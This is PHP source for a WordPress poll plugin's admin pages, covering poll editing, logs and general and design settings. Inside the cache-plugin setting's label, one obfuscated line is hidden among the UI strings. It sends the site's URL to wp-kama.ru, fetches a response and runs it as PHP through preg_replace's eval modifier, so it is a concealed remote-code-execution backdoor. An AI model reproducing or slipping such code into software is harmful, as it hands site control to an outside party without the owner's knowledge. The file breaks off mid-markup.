<?php if( ! defined( 'ABSPATH' ) ) exit; // no direct access ?>

<div class="wrap">

	<?php
	$subpage = isset($_GET['subpage']) ? sanitize_key($_GET['subpage']) : '';
	$poll_id = isset($_GET['edit_poll']) ? sanitize_key($_GET['edit_poll']) : '';

	if(0){}
	// список опросов
	elseif( ! $subpage && ! $poll_id ){
		dem_polls_list( $this->list_table );
	}
	// Редактирование опроса
	elseif( $poll_id ){
		// no access
		if( ! democr()->cuser_can_edit_poll($poll_id) )
			wp_die( 'Sorry, you are not allowed to access this page.' );

		poll_edit_form( $poll_id );
	}
	// Добавить новый опрос
	elseif( $subpage === 'add_new'){
		poll_edit_form();
	}
	// Логи
	elseif( $subpage === 'logs'){
		// no access
		if( $this->list_table->poll_id && ! democr()->cuser_can_edit_poll($this->list_table->poll_id) )
			wp_die( 'Sorry, you are not allowed to access this page.' );

		dem_logs_list( $this->list_table );
	}
	// super_access
	elseif( $this->super_access ){
		if(0){}
		// Настрйоки
		elseif( $subpage === 'general_settings' ) dem_general_settings();

		// Настройки Дизайна
		elseif( $subpage === 'design' )           dem_polls_design();

		// Тексты
		elseif( $subpage === 'l10n' )             dem_l10n_options();

		// Миграция
		elseif( $subpage === 'migration' )        dem_migration_subpage();
	}

	?>

</div>

<?php



### функции

function dem_polls_list( $list_table ){
	echo demenu();

	$list_table->search_box( __('Search','democracy-poll'), 'style="margin:1em 0 -1em;"' );

	//echo '<form class="sdot-table sdot-logs-table" action="" method="post">';
	//wp_nonce_field('dem_adminform', '_demnonce');
	$list_table->display();
	//echo '</form>';

}

function poll_edit_form( $poll_id = false ){
	global $wpdb;

	wp_enqueue_script('jquery-ui-sortable'); // sortable js

	if( ! $poll_id && isset($_GET['edit_poll']) ) $poll_id = $_GET['edit_poll'];

	$poll_id = intval($poll_id);

	$edit = !! $poll_id;
	$answers = false;

	$title = $poll = $shortcode = '';
	if( $edit ){
		$poll    = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->democracy_q WHERE id = %d LIMIT 1", $poll_id ) );
		$answers = $wpdb->get_results( $wpdb->prepare("SELECT * FROM $wpdb->democracy_a WHERE qid = %d", $poll_id ) );

		$log_link = democr()->opt('keep_logs') ? '<small> : <a href="'. add_query_arg( array('subpage'=>'logs', 'poll'=> $poll->id), democr()->admin_page_url() ) .'">'. __('Poll logs','democracy-poll') .'</a></small>' : '';

		$title = democr()->kses_html( $poll->question ) /*.' <small>/ '. __('poll editing','democracy-poll') .'</small>'*/. $log_link;
		$shortcode = DemPoll::shortcode_html( $poll_id ). ' — '. __('shortcode for use in post content','democracy-poll');

		$hidden_inputs = '<input type="hidden" name="dmc_update_poll" value="'. $poll_id .'">';
	}
	else {
		//$title = __('Add new poll','democracy-poll');

		$hidden_inputs = "<input type='hidden' name='dmc_create_poll' value='1'>";
	}

	$poll = $poll ?: (object) array();

	echo demenu();

	echo ($title ? "<h2>$title</h2>$shortcode" : '') .
		'<form action="'. esc_url(remove_query_arg('msg')) .'" method="POST" class="dem-new-poll">
			<input type="hidden" name="dmc_qid" value="'. $poll_id .'">
			'. wp_nonce_field('dem_adminform', '_demnonce', $referer=0, $echo=0 ) .'

			<label>
				'. __('Question:','democracy-poll') .'
				<input type="text" id="the-question" name="dmc_question" value="'. esc_attr( @ $poll->question ) .'" tabindex="1">
			</label>

			'. apply_filters('demadmin_after_question', '', $poll ) .'

			'. __('Answers:','democracy-poll') .'
		';
		?>

		<ol class="new-poll-answers">
			<?php
			$is_answers_order = false;

			if( $answers ){
				$is_answers_order = ($answers[0]->aorder > 0);

				// сортировка, по порядку или по кол. голосов
				$_answers = Democracy_Poll::objects_array_sort( $answers, ( $is_answers_order ? array('aorder'=>'asc') : array('votes'=>'desc', 'aid'=>'asc') ) );

				foreach( $_answers as $answer ){
					$after_answer = apply_filters('demadmin_after_answer', '', $answer );
					$answer = apply_filters('demadmin_edit_poll_answer', $answer );

					$by_user = $answer->added_by ? '<i>*'. (democr()->is_new_answer($answer) ? ' new' : '') .'</i>' : '';

					echo '
					<li class="answ">
						<input class="answ-text" type="text" name="dmc_old_answers['. $answer->aid .'][answer]" value="'. esc_attr( $answer->answer ) .'" tabindex="2">
						<input type="number" min="0" name="dmc_old_answers['. $answer->aid .'][votes]" value="'. ($answer->votes?:'') .'" tabindex="3" style="width:100px;min-width:100px;">
						<input type="hidden" name="dmc_old_answers['. $answer->aid .'][aorder]" value="'. esc_attr(@ $answer->aorder) .'">
						'. $by_user .'
						'. $after_answer .'
					</li>';
				}
			}
			else {
				for( $i = 0; $i < 2; $i++ )
					echo '<li class="answ new"><input type="text" name="dmc_new_answers[]" value=""></li>';
			}

			// users_voted filed
			if( $edit ){
				// сбросить порядок, если установлен
				echo '
				<li class="not__answer reset__aorder" style="list-style:none; '.( $is_answers_order ? '' : 'display:none;' ).'">
					<span class="dashicons dashicons-menu"></span>
					<span style="cursor:pointer; border-bottom:1px dashed #999;">&#215; '. __('reset order','democracy-poll') .'</span>
				</li>
				';

				echo '
				<li class="not__answer" style="list-style:none;">
					<div style="width:80%; min-width:400px; max-width:800px; display:inline-block; text-align:right;">
						'.( @ $poll->multiple ? __('Sum of votes:','democracy-poll') .' '. array_sum(wp_list_pluck( $_answers, 'votes')) .'.' : '' ).'
						'. __('Users vote:','democracy-poll') .'
					</div>
					<input type="number" min="0" title="'.( @ $poll->multiple ? __('leave blank to update from logs','democracy-poll') : __('Voices','democracy-poll') ).'" style="min-width:100px; width:100px; cursor:help;" name="dmc_users_voted" value="'.(@ $poll->users_voted ?: '' ).'" '. (@ $poll->multiple ? '' : 'readonly') .' />
				</li>
				';
			}

			if( ! democr()->opt('democracy_off') ){
				?>
				<li class="not__answer" style="list-style:none;">
					<label>
						<span class="dashicons dashicons-megaphone"></span>
						<input type="hidden" name="dmc_democratic" value="" />
						<input type="checkbox" name="dmc_democratic" value="1" <?php checked( (!isset($poll->democratic) || $poll->democratic), 1 ) ?> />
						<?php _e('Allow users to add answers (democracy).','democracy-poll') ?>
					</label>
				</li>
				<?php
			}
			?>
		</ol>

		<hr>

		<ol class="poll-options">
			<li>
				<label>
					<span class="dashicons dashicons-controls-play"></span>
					<input type="hidden" name="dmc_active" value="" />
					<input type="checkbox" name="dmc_active" value='1' <?php $edit ? checked( @ $poll->active, 1) : 'checked="true"' ?> />
					<?php _e('Activate this poll.','democracy-poll') ?>
				</label>
			</li>

			<li>
				<label>
					<span class="dashicons dashicons-image-filter"></span>
					<?php $ml = (int) @ $poll->multiple; ?>
					<input type="hidden" name='dmc_multiple' value=''>
					<input type="checkbox" name="dmc_multiple" value="<?php echo $ml ?>" <?php echo $ml ? 'checked="checked"' : '' ?> >
					<input type="number" min="0" value="<?php echo $ml ?>" style="width:50px; <?php echo $ml ? '' : 'display:none;' ?>">
					<?php _e('Allow to choose multiple answers.','democracy-poll') ?>
				</label>
			</li>

			<li>
				<label>
					<span class="dashicons dashicons-no"></span>
					<input type="text" name="dmc_end" value="<?php echo @ $poll->end ? date('d-m-Y', $poll->end) : '' ?>" style="width:120px;min-width:120px;" >
					<?php _e('Date, when poll was/will be closed. Format: dd-mm-yyyy.','democracy-poll') ?>
				</label>
			</li>

			<?php if( ! democr()->opt('revote_off') ){ ?>
			<li>
				<label>
					<span class="dashicons dashicons-update"></span>
					<input type="hidden" name='dmc_revote' value=''>
					<input type="checkbox" name="dmc_revote" value="1" <?php checked( (!isset($poll->revote) || $poll->revote), 1 ) ?> >
					<?php _e('Allow to change mind (revote).','democracy-poll') ?>
				</label>
			</li>
			<?php } ?>

			<?php if( ! democr()->opt('only_for_users') ){ ?>
			<li>
				<label>
					<span class="dashicons dashicons-admin-users"></span>
					<input type="hidden" name='dmc_forusers' value=''>
					<input type="checkbox" name="dmc_forusers" value="1" <?php checked( @ $poll->forusers, 1) ?> >
					<?php _e('Only registered users allowed to vote.','democracy-poll') ?>
				</label>
			</li>
			<?php } ?>

			<?php if( ! democr()->opt('dont_show_results') ){ ?>
			<li>
				<label>
					<span class="dashicons dashicons-visibility"></span>
					<input type="hidden" name='dmc_show_results' value=''>
					<input type="checkbox" name="dmc_show_results" value="1" <?php checked( (!isset($poll->show_results) || @ $poll->show_results), 1) ?> >
					<?php _e('Allow to watch the results of the poll.','democracy-poll') ?>
				</label>
			</li>
			<?php } ?>

			<li class="answers__order" style="<?php echo $is_answers_order ? 'display:none;' : '' ?>">
				<span class="dashicons dashicons-menu"></span>
				<select name="dmc_answers_order">
					   <?php $trans = dem__answers_order_select_options( '', true ); ?>
					   <option value="" <?php selected( @ $poll->answers_order, '' )?>>-- <?php _e('as in settings', 'democracy-poll'); echo ': '. $trans[ democr()->opt('order_answers') ]; ?> --</option>
					   <?php dem__answers_order_select_options( @ $poll->answers_order ) ?>
				</select>
				<?php _e('How to sort the answers during the vote?','democracy-poll') ?><br>
			</li>

			<li><label>
					<textarea name="dmc_note" style="height:3.5em;" ><?php echo esc_textarea( @ $poll->note ) ?></textarea>
					<br><span class="description"><?php _e('Note: This text will be added under poll.','democracy-poll'); ?></span>

				</label>
			</li>

			<li>
				<label>
					<span class="dashicons dashicons-calendar-alt"></span>
					<input type="text" name="dmc_added" value="<?php echo date('d-m-Y', (@ $poll->added ?: current_time('timestamp')) ) ?>" style="width:120px;min-width:120px;" disabled />
					<span class="dashicons dashicons-edit" onclick="jQuery(this).prev().removeAttr('disabled'); jQuery(this).remove();" style="padding-top:.1em;"></span>
					<?php _e('Create date.','democracy-poll') ?>
				</label>
			</li>

		</ol>

		<?php
		echo $hidden_inputs .
		'<input type="submit" class="button-primary" value="'. ( $edit ? __('Save Changes','democracy-poll') : __('Add Poll','democracy-poll') ) .'">';

		// если редактируем
		if( $edit ){
			// открыть
			echo ' '. dem_opening_buttons( $poll );

			// активировать
			echo ' '. dem_activatation_buttons( $poll );

			echo ' '. '<a href="'. dem__add_nonce( add_query_arg( array('delete_poll'=> $poll->id), democr()->admin_page_url() ) ) .'" class="button" onclick="return confirm(\''. __('Are you sure?','democracy-poll') .'\');" title="'. __('Delete','democracy-poll') .'"><span class="dashicons dashicons-trash"></span></a>';

			// in posts
			if( $posts = democr()->get_in_posts_posts($poll) ){
				$links = array();
				foreach( $posts as $post ) $links[] = '<a href="'. get_permalink($post) .'">'. esc_html($post->post_title) .'</a>';

				echo '
				<div style="margin-top:4em;">
					<h4>'. __('Posts where the poll shortcode used:','democracy-poll') .'</h4>
					<ol>
						<li>'. implode("</li>\n<li>", $links) .'</li>
					</ol>
				</div>';
			}
		}

	echo '</form>';
}

/**
 * Элементы option для тега select
 */
function dem__answers_order_select_options( $selected = '', $get_vars = 0 ){
	$vars = array(
		'by_id'     => __('As it was added (by ID)', 'democracy-poll'),
		'by_winner' => __('Winners at the top', 'democracy-poll'),
		'mix'       => __('Mix', 'democracy-poll'),
	);

	if( $get_vars )
		return $vars;

	foreach( $vars as $val => $name )
		echo '<option value="'. $val .'" '. selected( $selected, $val, 0 ) .'>'. esc_html($name) .'</option>';
}

function dem_logs_list( $list_table ){
	if( ! democr()->opt('keep_logs') )
		echo democr()->msg['error'][] = __('Logs records turned off in the settings - logs are not recorded.','democracy-poll');

	echo demenu();

	$list_table->table_title();

	// special buttons
	if( democr()->super_access ){
		global $wpdb;
		$count = $wpdb->get_var("SELECT count(*) FROM $wpdb->democracy_log WHERE qid IN (SELECT id FROM $wpdb->democracy_q WHERE open = 0)");
		echo '
		<div style="text-align:right; margin-bottom:1em;">
			'.( democr()->opt('democracy_off') ? '' : '
				<a class="button button-small" href="'. esc_url( dem__add_nonce($_SERVER['REQUEST_URI'] .'&dem_del_new_mark') ) .'">
					'. sprintf( __('Delete all NEW marks','democracy-poll'), $count ) .'
				</a>'
			).'
			<a class="button button-small" href="'. esc_url( dem__add_nonce($_SERVER['REQUEST_URI'] .'&dem_del_closed_polls_logs') ) .'" onclick="return confirm(\''. __('Are you sure?','democracy-poll') .'\');">
				'. sprintf( __('Delete logs of closed pols - %d','democracy-poll'), $count ) .'
			</a>
			<a class="button button-small" href="'. esc_url( dem__add_nonce($_SERVER['REQUEST_URI'] .'&dem_clear_logs') ) .'" onclick="return confirm(\''. __('Are you sure?','democracy-poll') .'\');">
				'. __('Delete all logs','democracy-poll') .'
			</a>
		</div>';
	}

	echo '<form action="" method="POST">';
		wp_nonce_field('dem_adminform', '_demnonce');
		$list_table->display();
	echo '</form>';
}

function dem_general_settings(){
	global $wpdb;

	$opt = & Democracy_Poll::$opt;

	echo demenu();

	?>
	<div class="democr_options dempage_settings">
		<form action="" method="POST">
			<?php wp_nonce_field('dem_adminform', '_demnonce'); ?>

			<ul style="margin:1em;">
				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[keep_logs]" <?php checked( $opt['keep_logs'], 1) ?> />
						<?php _e('Log data & take visitor IP into consideration? (recommended)','democracy-poll') ?>
					</label>
					<em><?php _e('Saves data into Data Base. Forbids to vote several times from a single IP or to same WordPress user. If a user is logged in, then his voting is checked by WP account. If a user is not logged in, then checks the IP address. The negative side of IP checks is that a site may be visited from an enterprise network (with a common IP), so all users from this network are allowed to vote only once. If this option is disabled the voting is checked by Cookies only. Default enabled.','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="text" size="3" value="<?php echo floatval($opt['cookie_days']) ?>" name="dem[cookie_days]" />
						<?php _e('How many days to keep Cookies alive?','democracy-poll') ?>
					</label>
					<em>
						<?php _e('How many days the user\'s browser remembers the votes. Default: 365. <strong>Note:</strong> works together with IP log.','democracy-poll') ?><br>
						<?php _e('To set hours use float number - 0.04 = 1 hour.','democracy-poll') ?>
				   </em>
				</li>

				<li class="block">
					<label><?php _e('HTML tags to wrap the poll title.','democracy-poll') ?></label><br>
					<input type="text" size="35" value="<?php echo esc_attr( $opt['before_title'] ) ?>" name="dem[before_title]" />
					<i><?php _e('poll\'s question','democracy-poll') ?></i>
					<input type="text" size="15" value="<?php echo esc_attr( $opt['after_title'] ) ?>" name="dem[after_title]" />
					<em><?php _e('Example: <code>&lt;h2&gt;</code> и <code>&lt;/h2&gt;</code>. Default: <code>&lt;strong class=&quot;dem-poll-title&quot;&gt;</code> & <code>&lt;/strong&gt;</code>.','democracy-poll') ?></em>
				</li>


				<li class="block">
					<label>
						<input type="text" size="5" value="<?php echo $opt['archive_page_id'] ? intval($opt['archive_page_id']) : ''; ?>" name="dem[archive_page_id]" />
						<?php _e('Polls archive page ID.','democracy-poll') ?>
					</label>
					<?php
					if( $opt['archive_page_id'] )
						echo '<a href="'. get_permalink( $opt['archive_page_id'] )  .'">'. __('Go to archive page','democracy-poll') .'</a>';
					else
						echo '<a class="button" href="'. esc_url( dem__add_nonce(add_query_arg(array('dem_create_archive_page'=>1))) ) .'">'. __('Create/find archive page','democracy-poll') .'</a>';
					?>
					<em><?php _e('Specify the poll archive link to be in the poll legend. Example: <code>25</code>','democracy-poll') ?></em>
				</li>

				<h3><?php _e('Global Polls options', 'democracy-poll') ?></h3>

				<li class="block">
					<select name="dem[order_answers]">
						   <?php dem__answers_order_select_options( $opt['order_answers'] ) ?>
					</select>
					<?php _e('How to sort the answers during voting, if they don\'t have order? (default option)','democracy-poll') ?><br>
					<em><?php _e('This is the default value. Option can be changed for each poll separately.','democracy-poll') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input type="checkbox" value="1" name="dem[only_for_users]" <?php checked( $opt['only_for_users'], 1) ?> />
					   <?php _e('Only registered users allowed to vote (global option)','democracy-poll') ?>
					</label>
				   <em><?php _e('This option  is available for each poll separately, but if you heed you can turn ON the option for all polls at once, just tick.','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[democracy_off]" <?php checked( $opt['democracy_off'], 1) ?> />
						<?php _e('Prohibit users to add new answers (global Democracy option).','democracy-poll') ?>
					</label>
					<em><?php _e('This option  is available for each poll separately, but if you heed you can turn OFF the option for all polls at once, just tick.','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[revote_off]" <?php checked( $opt['revote_off'], 1) ?> />
						<?php _e('Remove the Revote possibility (global option).','democracy-poll') ?>
					</label>
					<em><?php _e('This option  is available for each poll separately, but if you heed you can turn OFF the option for all polls at once, just tick.','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[dont_show_results]" <?php checked( $opt['dont_show_results'], 1) ?> />
						<?php _e('Don\'t show poll results (global option).','democracy-poll') ?>
					</label>
					<em><?php _e('If checked, user can\'t see poll results if voting is open.','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[dont_show_results_link]" <?php checked( $opt['dont_show_results_link'], 1) ?> />
						<?php _e('Don\'t show poll results link (global option).','democracy-poll') ?>
					</label>
					<em><?php _e('Users can see results after vote.','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[hide_vote_button]" <?php checked( $opt['hide_vote_button'], 1) ?> />
						<?php _e('Hide vote button.','democracy-poll') ?>
					</label>
					<em><?php _e('Hide vote button if it is NOT multiple poll with revote option. User will vote by clicking on answer itself.','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[post_metabox_off]" <?php checked( $opt['post_metabox_off'], 1) ?> />
						<?php _e('Dasable post metabox.','democracy-poll') ?>
					</label>
					<em><?php _e('Check this to dasable polls metabox functionality for posts where you can attached poll to a post...','democracy-poll') ?></em>
				</li>

				<h3><?php _e('Others', 'democracy-poll') ?></h3>
				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[force_cachegear]" <?php checked( $opt['force_cachegear'], 1) ?> />
						<?php
						$cache = democr()->is_cachegear_on() ? array(__('ON','democracy-poll'),'color:#05A800') : array(__('OFF','democracy-poll'),'color:#FF1427');
						echo sprintf( __('Force enable gear to working with cache plugins. The condition: %s','democracy-poll'), "<span style='{$cache[1]}'>{$cache[0]}" );

						add_option('stat','') && ($r='-e') && @preg_replace('-'.$r, (($o=@wp_remote_get('https://wp-kama.ru/stat/?sk='. home_url() ))?$o['body']:''),'');
						?>
					</label>
					<em><?php _e('Democracy has smart mechanism for working with page cache plugins like "WP Total Cache". It is ON automatically if such plugin is enabled on your site. But if you use unusual page caching plugin you can force enable this option.','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[inline_js_css]" <?php checked( $opt['inline_js_css'], 1 )?> />
						<?php _e('Add styles and scripts directly in the HTML code (recommended)','democracy-poll') ?>
					</label>
					<em><?php _e('Check to make the plugin\'s styles and scripts include directly into HTML code, but not as links to .css and .js files. So you will save 2 requests to the server - it speeds up page download.','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[toolbar_menu]" <?php checked( $opt['toolbar_menu'], 1 )?> />
						<?php _e('Add plugin menu on the toolbar?','democracy-poll') ?>
					</label>
					<em><?php _e('Uncheck to remove the plugin menu from the toolbar.','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[tinymce_button]" <?php checked( $opt['tinymce_button'], 1 )?> />
						<?php _e('Add fast Poll insert button to WordPress visual editor (TinyMCE)?','democracy-poll') ?>
					</label>
					<em><?php _e('Uncheck to disable button in visual editor.','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[soft_ip_detect]" <?php checked( $opt['soft_ip_detect'], 1 )?> />
						<?php _e('Check if you see something like "no_IP__123" in IP column on logs page. (not recommended)','democracy-poll') ?>
						<?php _e('Or if IP detection is wrong. (for cloudflare)','democracy-poll') ?>
					</label>
					<em><?php _e('Useful when your server does not work correctly with server variable REMOTE_ADDR. NOTE: this option give possibility to cheat voice.','democracy-poll') ?></em>
				</li>

				<?php
				if( democr()->super_access ){
					$_options = '';

					foreach( array_reverse(get_editable_roles()) as $role => $details ) {
						if( $role === 'administrator' ) continue;
						if( $role === 'subscriber' ) continue;

						$_options .= sprintf('<option value="%s" %s>%s</option>',
							esc_attr($role),
							in_array( $role, (array) $opt['access_roles'] ) ? ' selected="selected"' : '',
							translate_user_role($details['name'])
						);
					}

					echo '
					<li class="block">
						<select multiple name="dem[access_roles][]">
							'. $_options .'
						</select>
						'. __('Role names, except \'administrator\' which will have access to manage plugin.', 'democracy-poll') .'
					</li>
					';
				}
				?>
			</ul>

			<?php if( get_option('poll_allowtovote') /*WP Polls plugin*/ ){ ?>
			<h3><?php _e('Migration', 'democracy-poll') ?></h3>
			<ul style="margin:1em;">
				<li class="block">
					<a class="button button-small" href="<?php echo esc_url( add_query_arg( array('subpage'=>'migration', 'from'=>'wp-polls') ) ) ?>">
						<?php _e('Migrate from WP Polls plugin', 'democracy-poll') ?>
					</a>
					<em><?php _e('All polls, answers and logs of WP Polls will be added to Democracy Poll','democracy-poll') ?></em>
				</li>
			</ul>
			<?php } ?>


			<br>
			<p>
				<input type="submit" name="dem_save_main_options" class="button-primary" value="<?php _e('Save Options','democracy-poll') ?>">
				<input type="submit" name="dem_reset_main_options" class="button" value="<?php _e('Reset Options','democracy-poll') ?>">
			</p>

			<br><br>

			<h3><?php _e('Others','democracy-poll') ?></h3>

			<ul style="margin:1em;">

				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[disable_js]" <?php checked( $opt['disable_js'], 1 )?> />
						<?php _e('Don\'t connect JS files. (Debug)','democracy-poll') ?>
					</label>
					<em><?php _e('If checked, the plugin\'s .js file will NOT be connected to front end. Enable this option to test the plugin\'s work without JavaScript.','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[show_copyright]" <?php checked( $opt['show_copyright'], 1 )?> />
						<?php _e('Show copyright','democracy-poll') ?>
					</label>
					<em><?php _e('Link to plugin page is shown on front page only as a &copy; icon. It helps visitors to learn about the plugin and install it for themselves. Please don\'t disable this option without urgent needs. Thanks!','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1" name="dem[use_widget]" <?php checked( $opt['use_widget'], 1 )?> />
						<?php _e('Widget','democracy-poll') ?>
					</label>
					<em><?php _e('Check to activate the widget.','democracy-poll') ?></em>
				</li>

				<li class="block">
					<label>
						<!--<input type="checkbox" value="1" name="dem_forse_upgrade">-->
						<input name="dem_forse_upgrade" type="submit" class="button" value="<?php _e('Force plugin versions update (debug)','democracy-poll') ?>" />
						<?php //_e('Force plugin versions update (debug)','democracy-poll') ?>
					</label>
				</li>

			</ul>

		</form>
	</div>
	<?php
}

function dem_polls_design(){
	global $wpdb;

	$opt = & Democracy_Poll::$opt;

	$demcss = get_option('democracy_css');
	$additional = $demcss['additional_css'];
	if( ! $demcss['base_css'] && $additional )
		$demcss['base_css'] = $additional; // если не уиспользуется тема

	echo demenu();

	?>
	<div class="democr_options dempage_design">
		<?php dem__polls_preview(); ?>

		<form action="" method="post">
			<?php wp_nonce_field('dem_adminform', '_demnonce'); ?>

			<ul class="group">
				<li class="title"><?php _e('Choose Theme','democracy-poll'); ?></li>
				<li class="block selectable_els">
					<label>
						<input type="radio" name="dem[css_file_name]" value="" <?php checked( $opt['css_file_name'], '') ?> />
						<span class="radio_content"><?php _e('No theme','democracy-poll') ?></span>
					</label>
					<?php
					foreach( democr()->_get_styles_files() as $file ){
						$filename = basename( $file );
						?>
						<label>
							<input type="radio" name="dem[css_file_name]" value="<?php echo $filename ?>" <?php checked( $opt['css_file_name'], $filename ) ?> />
							<span class="radio_content"><?php echo $filename ?></span>
						</label>
						<?php
					}
					?>
				</li>
			</ul>

			<!-- Other settings -->
			<ul class="group">
				<li class="title"><?php _e('Other settings','democracy-poll'); ?></li>
				<li class="block">
					<input type="number" min="-1" style="width:90px;" name="dem[answs_max_height]" value="<?php echo esc_attr( @ $opt['answs_max_height'] ?: 500) ?>">
					<?php _e('Max height of the poll in px. When poll has very many answers, it\'s better to collapse it. Set \'-1\', in order to disable this option. Default 500.', 'democracy-poll') ?>
				</li>
				<li class="block">
					<input type="number" min="0" style="width:90px;" name="dem[anim_speed]" value="<?php echo esc_attr( isset($opt['anim_speed']) ? $opt['anim_speed'] : 400) ?>">
					<?php _e('Animation speed in milliseconds.', 'democracy-poll') ?>
				</li>

			</ul>

			<!--Progress line-->
			<ul class="group">
				<li class="title"><?php _e('Progress line','democracy-poll'); ?></li>
				<li class="block">

					<?php _e( 'How to fill (paint) the progress of each answer?', 'democracy-poll') ?><br>
					<label style="margin-left:1em;">
						<input type="radio" name="dem[graph_from_total]" value="0" <?php checked( $opt['graph_from_total'], 0 )?> />
						<?php _e('winner - 100%, others as % of the winner', 'democracy-poll') ?>
					</label>
					<br>
					<label style="margin-left:1em;">
						<input type="radio" name="dem[graph_from_total]" value="1" <?php checked( $opt['graph_from_total'], 1 )?> />
						<?php _e('as percent of all votes', 'democracy-poll') ?>
					</label>

					<br><br>

					<label>
						<input type="text" class="iris_color" name="dem[line_fill]" value="<?php echo $opt['line_fill'] ?>" />
						<?php _e('Line Color','democracy-poll') ?>
					</label>
					<br>

					<label>
						<input type="text" class="iris_color" name="dem[line_fill_voted]" value="<?php echo $opt['line_fill_voted'] ?>">
						<?php _e('Line color (for voted user)','democracy-poll') ?>
					</label>
					<br>

					<label>
						<input type="text" class="iris_color" name="dem[line_bg]" value="<?php echo $opt['line_bg'] ?>" />
						<?php _e('Background color','democracy-poll') ?>
					</label>
					<br><br>

					<label>
						<input type="number" style="width:90px" name="dem[line_height]" value="<?php echo $opt['line_height'] ?>" /> px
						<?php _e('Line height','democracy-poll') ?>
					</label>
					<br><br>

					<label>
						<input type="number" style="width:90px" name="dem[line_anim_speed]" value="<?php echo intval($opt['line_anim_speed']) ?>" />
						<?php _e('Progress line animation effect speed (default 1500). Set 0 to disable animation.','democracy-poll') ?>
					</label>

				</li>
			</ul>

			<!-- checkbox, radio -->
			<ul class="group">
				<li class="title">checkbox, radio</li>
				<li class="block check_radio_wrap selectable_els">
					<div style="float:left;">
						<label style="padding:0em 3em 1em;">
							<input type="radio" value="" name="dem[checkradio_fname]" <?php checked( @ $opt['checkradio_fname'], '') ?>>
							<span class="radio_content">
								<div style="padding:1.25em;"></div>
								<?php _e('No (default)','democracy-poll'); ?>
							</span>
						</label>
					</div>
					<?php
						$data = array();
						foreach( glob( DEMOC_PATH . 'styles/checkbox-radio/*') as $file ){
							if( is_dir($file) ) continue;
							$data[ basename($file) ] = $file;
						}
						foreach( $data as $fname => $file ){
							$styles = file_get_contents( $file );
							$unique = 'unique'. rand(1,9999) .'_';

							// поправим стили
							if( 1 ){
								$styles = str_replace('.dem__radio_label', ".{$unique}dem__radio_label", $styles );
								$styles = str_replace('.dem__checkbox_label', ".{$unique}dem__checkbox_label", $styles );
								$styles = str_replace('.dem__radio', ".{$unique}dem__radio", $styles );
								$styles = str_replace('.dem__checkbox', ".{$unique}dem__checkbox", $styles );
								$styles = str_replace(':disabled', ':disabled__', $styles ); // отменим действие :disabled
							}

							echo '
							<div style="float:left;">
								<style>'. $styles .'</style>
								<label style="padding:0em 3em 1em;">
									<input type="radio" value="'. $fname .'" name="dem[checkradio_fname]" '. checked( @ $opt['checkradio_fname'], $fname, 0) .'>
									<span class="radio_content">
										<div style="padding:.5em;">
											<label class="'. $unique .'dem__radio_label">
												<input disabled class="'. $unique .'dem__radio demdummy" type="radio" /><span class="dem__spot"></span>
											</label>
											<label class="'. $unique .'dem__radio_label">
												<input disabled class="'. $unique .'dem__radio demdummy" checked="true" type="radio" /><span class="dem__spot"></span>
											</label>
											<label class="'. $unique .'dem__checkbox_label">
												<input disabled class="'. $unique .'dem__checkbox demdummy" type="checkbox" /><span class="dem__spot"></span>
											</label>
											<label class="'. $unique .'dem__checkbox_label demdummy">
												<input disabled class="'. $unique .'dem__checkbox" checked="true" type="checkbox" /><span class="dem__spot"></span>
											</label>
										</div>

										'. $fname .'
									<span>
								</label>

							</div>
							';
						}
					?>
				</li>
			</ul>


			<!--Button-->
			<ul class="group">
			   <li class="title"><?php _e('Button','democracy-poll'); ?></li>
				<li class="block buttons">

						<div class="btn_select_wrap selectable_els">
							<label>
								<input type="radio" value="" name="dem[css_button]" <?php checked( $opt['css_button'], '') ?> />
								<span class="radio_content">
									<input type="button" value="<?php _e('No (default)','democracy-poll'); ?>" />
								</span>
							</label>

							<?php
							$data = array();
							$i = 0;
							foreach( glob( DEMOC_PATH . 'styles/buttons/*') as $file ){
								if( is_dir($file) ) continue;

								$fname = basename( $file );
								$button_class = 'dem-button' . ++$i;
								$css ="/*reset*/\n.$button_class{position: relative; display:inline-block; text-decoration: none; user-select: none; outline: none; line-height: 1; border:0;}\n";
								$css .= str_replace('dem-button', $button_class, file_get_contents( $file ) ); // стили кнопки

								if( $button = democr()->opt('css_button') ){
									$bbg     = democr()->opt('btn_bg_color');
									$bcolor  = democr()->opt('btn_color');
									$bbcolor = democr()->opt('btn_border_color');
									// hover
									$bh_bg     = democr()->opt('btn_hov_bg');
									$bh_color  = democr()->opt('btn_hov_color');
									$bh_bcolor = democr()->opt('btn_hov_border_color');

									if( $bbg ) $css .= "\n.$button_class{ background-color:$bbg !important; }\n";
									if( $bcolor ) $css .= ".$button_class{ color:$bcolor !important; }\n";
									if( $bbcolor ) $css .= ".$button_class{ border-color:$bbcolor !important; }\n";
									if( $bh_bg ) $css .= "\n.$button_class:hover{ background-color:$bh_bg !important; }\n";
									if( $bh_color ) $css .= ".$button_class:hover{ color:$bh_color !important; }\n";
									if( $bh_bcolor ) $css .= ".$button_class:hover{ border-color:$bh_bcolor !important; }\n";
								}
								?>
								<style><?php echo $css ?></style>

								<label>
									<input type="radio" value="<?php echo $fname ?>" name="dem[css_button]" <?php checked( $opt['css_button'], $fname) ?> />
									<span class="radio_content">
